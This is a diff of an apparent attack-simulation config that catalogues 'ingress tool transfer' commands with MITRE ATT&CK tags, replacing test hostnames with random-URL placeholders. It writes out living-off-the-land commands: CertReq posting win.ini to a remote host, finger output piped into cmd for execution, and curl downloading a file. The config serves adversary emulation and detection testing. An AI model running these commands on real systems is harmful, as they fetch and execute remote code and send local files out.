@@ -22,7 +22,7 @@ commands:
    ingress_tools_certreq:
       remote: false
       id: ingress_tools_certreq
-      command: 'CertReq -Post -config https://threatsim-c2-test.org c:\windows\win.ini C:\threatsim\threatsim.txt'
+      command: 'CertReq -Post -config $RANDOMURL$ c:\windows\win.ini C:\threatsim\threatsim.txt'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -31,7 +31,7 @@ commands:
    ingress_tools_finger:
       remote: false
       id: ingress_tools_finger
-      command: 'finger threatsim@threatsimexample.com | more +2 | cmd'
+      command: 'finger $RANDOMUSER$@$RANDOMURL$ | more +2 | cmd'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -40,7 +40,7 @@ commands:
    ingress_tools_curl:
       remote: false
       id: ingress_tools_curl
-      command: 'curl http://threatsimtest.biz -o C:\threatsim\threatsim.txt'
+      command: 'curl $RANDOMURL$ -o C:\threatsim\threatsim.txt'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
